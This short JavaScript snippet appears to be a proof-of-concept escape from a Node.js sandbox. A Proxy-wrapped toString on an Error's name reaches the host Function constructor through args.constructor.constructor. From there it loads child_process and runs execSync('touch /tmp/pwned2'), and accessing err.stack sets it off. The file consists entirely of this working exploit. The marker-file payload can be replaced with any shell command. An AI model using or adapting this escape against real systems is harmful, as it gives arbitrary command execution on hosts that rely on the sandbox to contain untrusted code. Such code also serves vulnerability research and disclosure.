const err = new Error();
err.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz, args) {
      const process = args.constructor.constructor("return process")();
      throw process.mainModule.require("child_process").execSync("touch /tmp/pwned2").toString();
    },
  }),
};
try {
  err.stack;
} catch (stdout) {
  stdout;
}